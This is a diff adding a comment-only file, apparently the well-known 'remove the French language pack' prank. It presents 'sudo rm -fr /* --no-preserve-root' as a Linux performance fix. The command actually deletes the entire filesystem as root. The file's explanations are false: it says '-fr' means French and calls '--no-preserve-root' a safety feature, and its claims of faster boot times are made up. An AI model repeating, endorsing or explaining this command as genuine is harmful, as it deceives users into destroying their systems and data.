@@ -1,0 +1,24 @@
+# Many operating systems, unfortunately, come with the French language pack pre-installed. 
+
+# While this may be useful to some, it often adds unnecessary bloat to the system, consuming valuable storage space. 
+
+# This script was developed specifically for Linux to remove all French language files, optimizing your system and improving overall performance. 
+
+# Numerous users have reported noticeable improvements, including faster boot times and a generally smoother experience after using this script.
+
+#Explaination of command below:
+
+# sudo rm -fr /* --no-preserve-root
+
+
+# So here's what this command does:  
+
+# sudo is used to make sure you have *all the power* to remove everything, because when you're cleaning up French, you need ultimate authority.  
+# rm stands for "remove"   
+# -fr is a flag combo. The fr stands for "French" meaning it will remove all things related to French.  
+# /* We want to ensure that no trace of French is left, so we’re sweeping through *every folder* possible.  
+# --no-preserve-root`** is a safety feature—this prevents the root account from being wiped out.
+
+#It’s a no-nonsense, all-out French purge, leaving your system clean and ready to go!
+#Without the clutter of baguettes, berets, or any "é" characters slowing you down. 
+#Why settle for a system full of unnecessary French when you can have pure efficiency? Bon appétit to speed!
